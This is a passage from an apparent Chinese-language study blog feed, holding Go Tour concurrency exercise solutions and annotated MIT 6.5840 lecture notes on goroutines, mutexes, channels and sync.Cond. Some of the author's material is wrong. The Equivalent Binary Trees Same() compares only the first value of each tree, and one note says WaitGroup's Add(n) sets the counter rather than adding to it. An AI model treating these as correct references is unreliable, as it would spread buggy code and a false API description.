class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> c &lt;- x:  <span class="comment">// 接受者不再读取chan时就会阻塞发送</span></span><br><span class="line">x, y = y, x+y</span><br><span class="line"><span class="keyword">case</span> &lt;-quit:</span><br><span class="line">fmt.Println(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">quit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">fmt.Println(&lt;-c)</span><br><span class="line">&#125;</span><br><span class="line">quit &lt;- <span class="number">0</span></span><br><span class="line">&#125;()</span><br><span class="line">fibonacci(c, quit)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Exercise-Equivalent-Binary-Trees"><a href="https://go.dev/tour/concurrency/7"><strong>Exercise: Equivalent Binary Trees</strong></a></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;golang.org/x/tour/tree&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Walk walks the tree t sending all values</span></span><br><span class="line"><span class="comment">// from the tree to the channel ch.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Walk</span><span class="params">(t *tree.Tree, ch <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> t == <span class="literal">nil</span> &#123;<span class="keyword">return</span>&#125;</span><br><span class="line">Walk(t.Left, ch)</span><br><span class="line">ch &lt;- t.Value</span><br><span class="line">Walk(t.Right, ch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Same determines whether the trees</span></span><br><span class="line"><span class="comment">// t1 and t2 contain the same values.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Same</span><span class="params">(t1, t2 *tree.Tree)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">ch1, ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>), <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">go</span> Walk(t1, ch1)</span><br><span class="line"><span class="keyword">go</span> Walk(t2, ch2)</span><br><span class="line"><span class="keyword">if</span> &lt;-ch1 == &lt;-ch2 &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Same(tree.New(1), tree.New(2)): &quot;</span>, Same(tree.New(<span class="number">1</span>), tree.New(<span class="number">2</span>)))</span><br><span class="line">fmt.Println(<span class="string">&quot;Same(tree.New(1), tree.New(1)): &quot;</span>, Same(tree.New(<span class="number">1</span>), tree.New(<span class="number">1</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Exercise-Web-Crawler"><a href="https://go.dev/tour/concurrency/10"><strong>Exercise: Web Crawler</strong></a></h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Fetcher <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Fetch returns the body of URL and</span></span><br><span class="line"><span class="comment">// a slice of URLs found on that page.</span></span><br><span class="line">Fetch(url <span class="type">string</span>) (body <span class="type">string</span>, urls []<span class="type">string</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> CrawlUrlMap <span class="keyword">struct</span> &#123;</span><br><span class="line">urlMap <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span></span><br><span class="line">mutex sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *CrawlUrlMap)</span></span> exists(url <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">m.mutex.Lock()</span><br><span class="line"><span class="keyword">defer</span> m.mutex.Unlock()</span><br><span class="line">_, ok := m.urlMap[url]</span><br><span class="line">m.urlMap[url] = <span class="literal">true</span></span><br><span class="line"><span class="keyword">return</span> ok</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定一部分进行初始化，其余部分使用零初始化</span></span><br><span class="line"><span class="keyword">var</span> crawlUrlMap = &amp;CrawlUrlMap&#123;</span><br><span class="line">urlMap: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg = sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Crawl uses fetcher to recursively crawl</span></span><br><span class="line"><span class="comment">// pages starting with url, to a maximum of depth.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Crawl</span><span class="params">(url <span class="type">string</span>, depth <span class="type">int</span>, fetcher Fetcher)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> depth &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">body, urls, err := fetcher.Fetch(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;found: %s %q\n&quot;</span>, url, body)</span><br><span class="line"><span class="keyword">for</span> _, u := <span class="keyword">range</span> urls &#123;</span><br><span class="line"><span class="keyword">if</span> !crawlUrlMap.exists(u) &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span> <span class="params">(url <span class="type">string</span>, depth <span class="type">int</span>, fetcher Fetcher)</span></span> &#123;</span><br><span class="line">Crawl(url, depth, fetcher)</span><br><span class="line">wg.Done()</span><br><span class="line">&#125; (u, depth<span class="number">-1</span>, fetcher)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !crawlUrlMap.exists(<span class="string">&quot;https://golang.org/&quot;</span>) &#123;</span><br><span class="line">Crawl(<span class="string">&quot;https://golang.org/&quot;</span>, <span class="number">4</span>, fetcher)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()  <span class="comment">// 等待子进程跑完</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fakeFetcher is Fetcher that returns canned results.</span></span><br><span class="line"><span class="keyword">type</span> fakeFetcher <span class="keyword">map</span>[<span class="type">string</span>]*fakeResult</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> fakeResult <span class="keyword">struct</span> &#123;</span><br><span class="line">body <span class="type">string</span></span><br><span class="line">urls []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f fakeFetcher)</span></span> Fetch(url <span class="type">string</span>) (<span class="type">string</span>, []<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> res, ok := f[url]; ok &#123;</span><br><span class="line"><span class="keyword">return</span> res.body, res.urls, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;not found: %s&quot;</span>, url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fetcher is a populated fakeFetcher.</span></span><br><span class="line"><span class="keyword">var</span> fetcher = fakeFetcher&#123;</span><br><span class="line"><span class="string">&quot;https://golang.org/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line"><span class="string">&quot;The Go Programming Language&quot;</span>,</span><br><span class="line">[]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://golang.org/cmd/&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line"><span class="string">&quot;Packages&quot;</span>,</span><br><span class="line">[]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;https://golang.org/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://golang.org/cmd/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/fmt/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/os/&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/fmt/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line"><span class="string">&quot;Package fmt&quot;</span>,</span><br><span class="line">[]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;https://golang.org/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/os/&quot;</span>: &amp;fakeResult&#123;</span><br><span class="line"><span class="string">&quot;Package os&quot;</span>,</span><br><span class="line">[]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;https://golang.org/&quot;</span>,</span><br><span class="line"><span class="string">&quot;https://golang.org/pkg/&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>WaitGroup 对象内部有一个计数器，最初从0开始，它有三个方法：Add(), Done(), Wait() 用来控制计数器的数量。</p><ul><li>Add(n) 把计数器设置为n</li><li>Done() 每次把计数器-1</li><li>wait() 会阻塞代码的运行，直到计数器地值减为0。</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.5840 2023 Lecture 2 Threads and RPC</title>
      <link href="/2023/09/29/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-2-ThreadsAndRPC/"/>
      <url>/2023/09/29/%E5%88%86%E5%B8%83%E5%BC%8F-MIT6-5840-Lec-2-ThreadsAndRPC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>课程网址：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">https://pdos.csail.mit.edu/6.824/schedule.html</a><br>以下内容来自课程课件，由于课件纯文本显示效果不佳，故对其排版整理并添加了部分个人笔记批注。</p></blockquote><h1 id="Implementing-distributed-systems">Implementing distributed systems</h1><p>Core infrastructures: threads and RPC (in Go)<br>Important for the labs</p><h1 id="Why-Go">Why Go?</h1><ol><li>good support for threads</li><li>convenient RPC</li><li>type- and memory- safe</li><li>garbage-collected (no use after freeing problems)<br>threads + GC is particularly attractive!</li><li>not too complex</li><li>many recent distributed systems implemented in Go</li></ol><blockquote><p>After the <a href="https://tour.go-zh.org/list">tutorial</a>, use <a href="https://golang.org/doc/effective_go.html">https://golang.org/doc/effective_go.html</a></p></blockquote><h2 id="Threads">Threads</h2><ul><li>a useful structuring tool, but can be tricky</li><li>Go calls them <code>goroutines</code>; everyone else calls them threads</li></ul><h3 id="Thread-“thread-of-execution”">Thread = “thread of execution”</h3><ul><li>threads allow one program to do many things at once</li><li>each thread executes serially, just like an ordinary non-threaded program</li><li>threads share memory</li><li>each thread includes some per-thread state:<br>program counter, registers, <strong>stack</strong>, what it’s waiting for</li></ul><blockquote><p>serially(连续地,逐次地)</p><p><a href="https://interviewguide.cn/notes/03-hunting_job/02-interview/02-01-os.html#_1%E3%80%81%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E8%81%94%E7%B3%BB">进程、线程和协程的区别和联系</a></p></blockquote><h3 id="Why-threads">Why threads?</h3><ul><li><strong>I/O concurrency</strong><br>Client sends requests to many servers in parallel and waits for replies.<br>Server processes multiple client requests; each request may block.<br><strong>While waiting for the disk to read data for client X, process a request from client Y.</strong></li><li><strong>Multicore performance</strong><br>Execute code in parallel on several cores.</li><li>Convenience<br>In background, once per second, check whether each worker is still alive.</li></ul><h3 id="Is-there-an-alternative-to-threads">Is there an alternative to threads?</h3><ul><li>Yes: write code that explicitly interleaves(interleaf交织) activities, in a single thread.<br>Usually called “<code>event-driven</code>”.</li><li>Keep a table of state about each activity, e.g. each client request.</li><li>One “event” loop that:<br>checks for new input for each activity (e.g. arrival of reply from server),<br>does the next step for each activity,<br>updates state.</li><li>Event-driven gets you I/O concurrency,<br>and eliminates thread costs (which can be substantial),<br>but doesn’t get multi-core speedup,<br>and is painful to program.</li></ul><blockquote><p>感觉这个”事件驱动“和select、epoll有点像</p></blockquote><h3 id="Threading-challenges">Threading challenges:</h3><ol><li><p><strong>sharing data safely</strong><br>what if two threads do n = n + 1 at the same time?<br>or one thread reads while another increments?<br>this is a “<strong>race</strong>” – and is often a bug<br>-&gt; use locks (Go’s <code>sync.Mutex</code>)<br>-&gt; or avoid sharing mutable data</p><blockquote><p>避免sharing的方式，比如说使用<code>channels</code></p></blockquote></li><li><p><strong>coordination between threads</strong><br>one thread is producing data, another thread is consuming it<br>how can the consumer wait (and release the CPU)?<br>how can the producer wake up the consumer?<br>-&gt; use Go channels or <code>sync.Cond</code> or <code>sync.WaitGroup</code></p></li><li><p><strong>deadlock</strong><br>cycles via locks and/or communication (e.g. RPC or Go channels)</p></li></ol><hr><h1 id="tutorial’s-web-crawler-as-a-threading-example">tutorial’s web crawler as a threading example</h1><h2 id="Crawler-challenges">Crawler challenges</h2><ul><li>Exploit I/O concurrency<br>Network latency is more limiting than network capacity<br>Fetch many pages in parallel<br>To increase URLs fetched per second<br>=&gt; Use threads for concurrency</li><li>Fetch each URL only <em>once</em><br>avoid wasting network bandwidth<br>be nice to remote servers<br>=&gt; Need to remember which URLs visited<br>Know when finished</li></ul><h2 id="ConcurrentMutex-crawler">ConcurrentMutex crawler</h2><p><strong>Why the Mutex (Lock() and Unlock()) in testAndSet?</strong></p><ul><li>the lock protects the data<br>The code between lock/unlock is often called a “critical section”</li><li>Internally, map is a complex data structure (tree? expandable(可扩展的) hash?)<br>Concurrent update/update may wreck(破坏) internal invariants<br>Concurrent update/read may crash the read</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> fetchState <span class="keyword">struct</span> &#123;</span><br><span class="line">mu      sync.Mutex</span><br><span class="line">fetched <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(fs *fetchState)</span></span> testAndSet(url <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">fs.mu.Lock()  <span class="comment">// the lock protects the data</span></span><br><span class="line"><span class="keyword">defer</span> fs.mu.Unlock()</span><br><span class="line">r := fs.fetched[url]</span><br><span class="line">fs.fetched[url] = <span class="literal">true</span></span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcurrentMutex</span><span class="params">(url <span class="type">string</span>, fetcher Fetcher, fs *fetchState)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> fs.testAndSet(url) &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">urls, err := fetcher.Fetch(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> done sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> _, u := <span class="keyword">range</span> urls &#123;</span><br><span class="line">done.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(u <span class="type">string</span>)</span></span> &#123;  <span class="comment">// anonymous function</span></span><br><span class="line"><span class="keyword">defer</span> done.Done()</span><br><span class="line">ConcurrentMutex(u, fetcher, fs)</span><br><span class="line">&#125;(u)</span><br><span class="line">&#125;</span><br><span class="line">    done.Wait()  <span class="comment">// sleep until counter becomes zero: sleep will not use CPU time</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>How does the ConcurrentMutex crawler decide it is done?</strong><br>sync.WaitGroup<br>Wait() waits for all Add()s to be balanced by Done()s<br>i.e. waits for all child threads to finish</p><h2 id="ConcurrentChannel-crawler">ConcurrentChannel crawler</h2><ul><li>channels both communicate and synchronize</li><li>several threads can send and receive on a channel</li><li>channels are cheap</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(url <span class="type">string</span>, ch <span class="keyword">chan</span> []<span class="type">string</span>, fetcher Fetcher)</span></span> &#123;</span><br><span class="line">urls, err := fetcher.Fetch(url)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">ch &lt;- []<span class="type">string</span>&#123;&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ch &lt;- urls</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">coordinator</span><span class="params">(ch <span class="keyword">chan</span> []<span class="type">string</span>, fetcher Fetcher)</span></span> &#123;</span><br><span class="line">n := <span class="number">1</span></span><br><span class="line">fetched := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>)</span><br><span class="line"><span class="keyword">for</span> urls := <span class="keyword">range</span> ch &#123;</span><br><span class="line"><span class="keyword">for</span> _, u := <span class="keyword">range</span> urls &#123;</span><br><span class="line"><span class="keyword">if</span> fetched[u] == <span class="literal">false</span> &#123;</span><br><span class="line">fetched[u] = <span class="literal">true</span></span><br><span class="line">n += <span class="number">1</span></span><br><span class="line"><span class="keyword">go</span> worker(u, ch, fetcher)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">n -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ConcurrentChannel</span><span class="params">(url <span class="type">string</span>, fetcher Fetcher)</span></span> &#123;</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> []<span class="type">string</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch &lt;- []<span class="type">string</span>&#123;url&#125;</span><br><span class="line">&#125;()</span><br><span class="line">coordinator(ch, fetcher)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Note: there is no recursion here; instead there’s a work list.</li><li>Note: no need to lock the fetched map, because it isn’t shared!</li></ul><h3 id="Worker-thread-writes-url-slice-coordinator-reads-it-is-that-a-race">Worker thread writes url slice, coordinator reads it, is that a race?</h3><ul><li>worker only writes slice <em>before</em> sending</li><li>coordinator only reads slice <em>after</em> receiving<br>So they can’t use the slice at the same time.</li></ul><h3 id="Why-does-ConcurrentChannel-create-a-goroutine-just-for-“ch-…”">Why does ConcurrentChannel() create a goroutine just for “ch &lt;- …”?</h3><p>Let’s get rid of the goroutine…（没看懂啥意思）</p><blockquote><p>个人理解：对于无缓冲的channel，如果channel中已有数据，这时向channel写入数据的线程会被阻塞</p></blockquote><h3 id="When-to-use-sharing-and-locks-versus-与…相比-channels">When to use sharing and locks, versus(与…相比) channels?</h3><ul><li>Most problems can be solved in either style</li><li>What makes the most sense depends on how the programmer thinks<ul><li>state – sharing and locks</li><li>communication – channels</li></ul></li><li>For the 6.824 labs, I recommend sharing+locks for state,<br>and sync.Cond or channels or time.Sleep() for waiting/notification.</li></ul><blockquote><p>实验中本人设计state是使用Lock的，但任务队列使用的是channel</p></blockquote><h1 id="vote-count-example">vote-count example</h1><h2 id="vote-count-4-go">vote-count-4.go</h2><p>一个相对较好的使用 <code>Mutex</code> 和 <code>cond</code> 的例子。</p><p>根据<a href="https://geektutu.com/post/hpg-sync-cond.html">《Go 语言高性能编程》</a>中的介绍：<code>sync.Cond</code> 条件变量用来协调想要访问共享资源的那些 goroutine，当共享资源的状态发生变化的时候，它可以用来通知被互斥锁阻塞的 goroutine。</p><ul><li><p>NewCond 创建实例<br><code>func NewCond(l Locker) *Cond</code></p></li><li><p>Broadcast 唤醒所有等待条件变量 c 的 goroutine，无需锁保护<br><code>func (c *Cond) Broadcast()</code></p></li><li><p>ignal 只唤醒<strong>任意 1 个</strong>等待条件变量 c 的 goroutine，无需锁保护</p><p><code>func (c *Cond) Signal()</code></p></li><li><p>调用 Wait 会自动释放锁 c.L，并挂起调用者所在的 goroutine，因此当前协程会阻塞在 Wait 方法调用的地方。<br>如果其他协程调用了 Signal 或 Broadcast 唤醒了该协程，那么 Wait 方法在结束阻塞时，会重新给 c.L 加锁，并且继续执行 Wait 后面的代码。<br><code>func (c *Cond) Wait()</code></p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano())</span><br><span class="line"></span><br><span class="line">count := <span class="number">0</span></span><br><span class="line">finished := <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> mu sync.Mutex</span><br><span class="line">cond := sync.NewCond(&amp;mu)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">vote := requestVote()</span><br><span class="line">mu.Lock()</span><br><span class="line"><span class="keyword">defer</span> mu.Unlock()</span><br><span class="line"><span class="keyword">if</span> vote &#123;</span><br><span class="line">count++</span><br><span class="line">&#125;</span><br><span class="line">finished++</span><br><span class="line">cond.Broadcast()</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mu.Lock()</span><br><span class="line"><span class="keyword">for</span> count &lt; <span class="number">5</span> &amp;&amp; finished != <span class="number">10</span> &#123;</span><br><span class="line">cond.Wait()  <span class="comment">// 等待解锁并原子地进入睡眠; 